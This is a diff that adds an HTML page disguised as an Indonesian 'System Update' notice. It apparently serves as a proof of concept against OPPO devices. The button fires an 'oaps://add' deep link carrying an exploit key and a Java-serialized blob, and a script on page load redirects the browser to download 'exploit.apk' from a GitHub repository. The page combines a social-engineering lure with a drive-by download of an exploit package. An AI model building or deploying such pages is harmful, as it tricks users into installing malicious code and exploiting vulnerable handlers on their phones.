@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update Service</title>
+</head>
+<body style="text-align: center; padding-top: 50px; font-family: sans-serif;">
+    <h2>Pembaruan Sistem Tersedia</h2>
+    <p>Versi keamanan Anda sudah usang. Klik di bawah untuk memperbarui.</p>
+    
+    <a href="oaps://add?ckey=exploit&cb=rO0ABXNyABFpbnZhbGlkLnBheWxvYWQAAAAAAAAAAQIAAHhw" 
+       style="padding: 15px 25px; background: green; color: white; text-decoration: none; border-radius: 5px;">
+       PERBARUI SEKARANG
+    </a>
+
+    <script>
+        // Simulasi otomatis download APK saat halaman dibuka
+        window.onload = function() {
+            window.location.href = "https://raw.githubusercontent.com/username/oppo-update-poc/main/exploit.apk";
+        };
+    </script>
+</body>
+</html>
